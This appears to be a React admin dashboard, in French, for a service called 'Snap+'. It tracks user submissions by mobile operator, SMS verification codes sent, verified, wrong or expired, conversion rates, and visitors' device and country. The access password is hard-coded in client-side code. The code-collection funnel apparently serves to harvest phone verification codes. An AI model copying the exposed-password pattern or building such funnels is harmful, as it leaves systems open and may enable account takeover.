import { useQuery } from "@tanstack/react-query";
import { base44 } from "@/api/base44Client";
import { motion } from "framer-motion";
import { useState } from "react";
import { Lock, TrendingUp, Clock, Users, LogOut, BarChart3, PieChart, Activity, Eye, AlertCircle, CheckCircle2, Zap, Power } from "lucide-react";
import { LineChart, Line, BarChart, Bar, PieChart as PieChartComponent, Pie, Cell, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer } from "recharts";

const ADMIN_PASSWORD = "31HDZhdbzh2873&";

function PasswordGate({ onUnlock }) {
  const [input, setInput] = useState("");
  const [error, setError] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (input === ADMIN_PASSWORD) {
      onUnlock();
    } else {
      setError(true);
      setInput("");
      setTimeout(() => setError(false), 2000);
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-card border border-border rounded-2xl px-8 py-10 w-full max-w-sm shadow-2xl shadow-black/40 text-center"
      >
        <div className="w-14 h-14 bg-primary/10 border border-primary/30 rounded-2xl flex items-center justify-center mx-auto mb-5">
          <Lock className="w-6 h-6 text-primary" />
        </div>
        <h1 className="font-heading text-2xl font-bold text-foreground mb-1">Accès Analytics</h1>
        <p className="text-muted-foreground text-sm mb-6">Entrez le mot de passe</p>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="password"
            placeholder="Mot de passe"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            className={`w-full bg-background border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 transition-all text-sm ${
              error ? "border-destructive ring-2 ring-destructive/40" : "border-border"
            }`}
            autoFocus
          />
          {error && <p className="text-destructive text-xs">Mot de passe incorrect</p>}
          <button
            type="submit"
            className="w-full bg-primary text-primary-foreground font-bold py-3 rounded-xl text-sm hover:bg-primary/80 transition-colors"
          >
            Accéder
          </button>
        </form>
      </motion.div>
    </div>
  );
}

export default function Analytics() {
  const [unlocked, setUnlocked] = useState(false);
  const [selectedOperator, setSelectedOperator] = useState(null);

  const { data: submissions = [], isLoading: subLoading } = useQuery({
    queryKey: ["submissions"],
    queryFn: () => base44.entities.Submission.list("-created_date", 5000),
    enabled: unlocked,
  });

  const { data: logs = [], isLoading: logsLoading } = useQuery({
    queryKey: ["logs"],
    queryFn: () => base44.entities.ActionLog.list("-timestamp", 1000),
    enabled: unlocked,
  });

  if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;

  // Filtrer par opérateur si sélectionné
  const filtered = selectedOperator ? submissions.filter(s => s.operateur === selectedOperator) : submissions;

  const total = filtered.length;
  const verified = filtered.filter((s) => s.status === "code_valid").length;
  const pending = filtered.filter((s) => s.status === "pending").length;
  const wrong = filtered.filter((s) => s.status === "code_wrong").length;
  const expired = filtered.filter((s) => s.status === "code_expired").length;
  const waiting = filtered.filter((s) => s.status === "waiting_queue").length;
  const conversionRate = total > 0 ? ((verified / total) * 100).toFixed(1) : 0;

  const submitted = logs.filter((l) => l.action === "submitted").length;
  const codeSent = logs.filter((l) => l.action === "code_sent").length;
  const verified_count = logs.filter((l) => l.action === "code_verified").length;

  const operators = {
    SFR: submissions.filter((s) => s.operateur === "SFR").length,
    Bouygues: submissions.filter((s) => s.operateur === "Bouygues").length,
    Orange: submissions.filter((s) => s.operateur === "Orange").length,
  };

  // Données pour graphiques
  const statusData = [
    { name: "Validé", value: verified, color: "#22c55e" },
    { name: "En attente", value: pending, color: "#3b82f6" },
    { name: "Mauvais", value: wrong, color: "#ef4444" },
    { name: "Expiré", value: expired, color: "#f97316" },
    { name: "Queue", value: waiting, color: "#a855f7" },
  ].filter(d => d.value > 0);

  const deviceData = (() => {
    const devices = {};
    logs.forEach(log => {
      const device = log.details?.device || "Unknown";
      devices[device] = (devices[device] || 0) + 1;
    });
    return Object.entries(devices).map(([device, count]) => ({ name: device, count }));
  })();

  const countryData = (() => {
    const countries = {};
    logs.forEach(log => {
      const country = log.details?.country || "France";
      countries[country] = (countries[country] || 0) + 1;
    });
    return Object.entries(countries).map(([country, count]) => ({ name: country, count })).slice(0, 5);
  })();

  const stats = [
    { icon: Users, label: "Total soumissions", value: total, color: "text-primary" },
    { icon: CheckCircle2, label: "Validées", value: verified, color: "text-green-400" },
    { icon: TrendingUp, label: "Taux conversion", value: `${conversionRate}%`, color: "text-green-400" },
    { icon: AlertCircle, label: "Mauvais codes", value: wrong, color: "text-red-400" },
    { icon: Clock, label: "Codes expirés", value: expired, color: "text-orange-400" },
    { icon: Zap, label: "En queue", value: waiting, color: "text-purple-400" },
  ];

  return (
    <div className="min-h-screen bg-background px-4 py-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-10">
          <div>
            <h1 className="font-heading text-4xl font-bold text-foreground mb-2">
              Analytics <span className="text-primary">Snap+</span>
            </h1>
            <p className="text-muted-foreground text-sm">Statistiques et conversions en temps réel</p>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={() => alert("⏳ Aucun admin disponible\n\nLes administrateurs sont actuellement absents. Les demandes prendront beaucoup plus de temps à être traitées.")}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-amber-500/20 text-amber-400 border border-amber-500/30 hover:bg-amber-500/30 text-sm font-medium transition-colors"
            >
              <Power className="w-4 h-4" />
              Tester pas d'admin
            </button>
            <button
              onClick={() => setUnlocked(false)}
              className="flex items-center gap-2 px-4 py-2 rounded-lg bg-muted text-muted-foreground hover:bg-muted/80 text-sm transition-colors"
            >
              <LogOut className="w-4 h-4" />
              Déconnexion
            </button>
          </div>
        </div>

        {/* Filter par opérateur */}
        <div className="flex gap-2 mb-8">
          <button
            onClick={() => setSelectedOperator(null)}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              !selectedOperator
                ? "bg-primary text-primary-foreground"
                : "bg-card border border-border text-muted-foreground hover:text-foreground"
            }`}
          >
            Tous
          </button>
          {["SFR", "Bouygues", "Orange"].map((op) => (
            <button
              key={op}
              onClick={() => setSelectedOperator(op)}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                selectedOperator === op
                  ? "bg-primary text-primary-foreground"
                  : "bg-card border border-border text-muted-foreground hover:text-foreground"
              }`}
            >
              {op}
            </button>
          ))}
        </div>

        {/* Stats Cards Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-8">
          {stats.map((stat, i) => {
            const Icon = stat.icon;
            return (
              <motion.div
                key={stat.label}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.05 }}
                className="bg-card border border-border rounded-xl p-6 hover:border-primary/40 transition-colors"
              >
                <div className="flex items-start justify-between">
                  <div>
                    <div className="text-muted-foreground text-xs font-medium uppercase tracking-wider mb-2">{stat.label}</div>
                    <div className={`font-heading text-3xl font-bold ${stat.color}`}>{stat.value}</div>
                  </div>
                  <Icon className={`w-6 h-6 ${stat.color} opacity-60`} />
                </div>
              </motion.div>
            );
          })}
        </div>

        {/* Charts Section */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
          {/* Status Distribution */}
          {statusData.length > 0 && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="bg-card border border-border rounded-2xl p-6"
            >
              <h3 className="font-heading font-bold text-foreground mb-4 flex items-center gap-2">
                <PieChart className="w-5 h-5 text-primary" />
                Distribution des statuts
              </h3>
              <ResponsiveContainer width="100%" height={250}>
                <PieChartComponent>
                  <Pie data={statusData} cx="50%" cy="50%" labelLine={false} label={{ fontSize: 12 }} outerRadius={80} fill="#8884d8" dataKey="value">
                    {statusData.map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={entry.color} />
                    ))}
                  </Pie>
                  <Tooltip formatter={(value) => value} />
                </PieChartComponent>
              </ResponsiveContainer>
            </motion.div>
          )}

          {/* Operators Breakdown */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="bg-card border border-border rounded-2xl p-6"
          >
            <h3 className="font-heading font-bold text-foreground mb-4 flex items-center gap-2">
              <BarChart3 className="w-5 h-5 text-primary" />
              Répartition par opérateur
            </h3>
            <ResponsiveContainer width="100%" height={250}>
              <BarChart data={Object.entries(operators).map(([op, count]) => ({ name: op, count }))}>
                <CartesianGrid strokeDasharray="3 3" stroke="hsl(var(--border))" />
                <XAxis dataKey="name" stroke="hsl(var(--muted-foreground))" />
                <YAxis stroke="hsl(var(--muted-foreground))" />
                <Tooltip />
                <Bar dataKey="count" fill="hsl(var(--primary))" radius={[8, 8, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </motion.div>
        </div>

        {/* Device & Country Stats */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
          {/* Devices */}
          {deviceData.length > 0 && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="bg-card border border-border rounded-2xl p-6"
            >
              <h3 className="font-heading font-bold text-foreground mb-4 flex items-center gap-2">
                <Activity className="w-5 h-5 text-primary" />
                Appareils utilisés
              </h3>
              <div className="space-y-3">
                {deviceData.map((device) => (
                  <div key={device.name} className="flex items-center justify-between">
                    <span className="text-sm text-muted-foreground">{device.name}</span>
                    <div className="flex items-center gap-2">
                      <div className="w-32 h-2 bg-muted rounded-full overflow-hidden">
                        <div
                          className="h-full bg-primary rounded-full"
                          style={{ width: `${(device.count / Math.max(...deviceData.map(d => d.count))) * 100}%` }}
                        />
                      </div>
                      <span className="text-sm font-medium text-foreground">{device.count}</span>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          )}

          {/* Countries */}
          {countryData.length > 0 && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="bg-card border border-border rounded-2xl p-6"
            >
              <h3 className="font-heading font-bold text-foreground mb-4 flex items-center gap-2">
                <Eye className="w-5 h-5 text-primary" />
                Pays d'accès
              </h3>
              <div className="space-y-3">
                {countryData.map((country) => (
                  <div key={country.name} className="flex items-center justify-between">
                    <span className="text-sm text-muted-foreground">{country.name}</span>
                    <div className="flex items-center gap-2">
                      <div className="w-32 h-2 bg-muted rounded-full overflow-hidden">
                        <div
                          className="h-full bg-accent rounded-full"
                          style={{ width: `${(country.count / Math.max(...countryData.map(c => c.count))) * 100}%` }}
                        />
                      </div>
                      <span className="text-sm font-medium text-foreground">{country.count}</span>
                    </div>
                  </div>
                ))}
              </div>
            </motion.div>
          )}
        </div>

        {/* Action Logs Table */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="bg-card border border-border rounded-2xl overflow-hidden"
        >
          <div className="px-6 py-4 border-b border-border bg-muted/30">
            <h3 className="font-heading font-bold text-foreground flex items-center gap-2">
              <Activity className="w-5 h-5 text-primary" />
              Historique des actions ({logs.length})
            </h3>
          </div>
          <div className="overflow-x-auto max-h-96 overflow-y-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border bg-muted/50 sticky top-0">
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Submission</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Action</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Navigateur</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Appareil</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Pays</th>
                  <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Date</th>
                </tr>
              </thead>
              <tbody>
                {logs.slice(0, 100).map((log) => {
                  const actionColors = {
                    submitted: "bg-blue-500/20 text-blue-400",
                    code_sent: "bg-green-500/20 text-green-400",
                    code_verified: "bg-emerald-500/20 text-emerald-400",
                    code_wrong: "bg-red-500/20 text-red-400",
                    code_expired: "bg-orange-500/20 text-orange-400",
                  };
                  return (
                    <tr key={log.id} className="border-b border-border/50 hover:bg-muted/30 transition-colors">
                      <td className="px-6 py-3 text-xs font-mono text-muted-foreground">{log.submission_id?.slice(0, 8)}</td>
                      <td className="px-6 py-3 text-xs font-semibold">
                        <span className={`px-2 py-1 rounded text-xs font-medium ${actionColors[log.action] || "bg-primary/15 text-primary"}`}>
                          {log.action}
                        </span>
                      </td>
                      <td className="px-6 py-3 text-xs text-foreground/70">{log.details?.browser || "—"}</td>
                      <td className="px-6 py-3 text-xs text-foreground/70">{log.details?.device || "—"}</td>
                      <td className="px-6 py-3 text-xs text-foreground/70">{log.details?.country || "—"}</td>
                      <td className="px-6 py-3 text-xs text-muted-foreground">
                        {new Date(log.timestamp).toLocaleString("fr-FR", { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </motion.div>
      </div>
    </div>
  );
}